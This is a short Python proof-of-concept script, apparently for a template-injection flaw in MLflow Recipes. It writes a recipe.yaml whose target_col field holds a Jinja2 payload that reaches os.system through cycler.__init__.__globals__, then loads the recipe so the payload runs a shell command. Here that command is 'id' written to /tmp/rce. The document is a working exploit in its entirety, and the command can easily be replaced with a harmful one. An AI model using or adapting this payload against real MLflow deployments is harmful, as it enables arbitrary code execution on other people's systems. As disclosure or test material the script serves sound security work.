import os

os.makedirs("./recipes/profiles", exist_ok=True)

with open("./recipes/profiles/local.yaml", "w") as file:
    file.write("profile: local")

recipe_content = '''\
recipe: "regression/v1"
target_col: {{ cycler.__init__.__globals__.os.system("id > /tmp/rce") }}
'''
with open("./recipes/recipe.yaml", "w") as file:
    file.write(recipe_content)


run_script_content = '''\
import os
from mlflow.recipes import Recipe

os.chdir("./recipes")

regression_recipe = Recipe(profile="local")
'''
with open("run.py", "w") as file:
    file.write(run_script_content)


os.system("python3 run.py")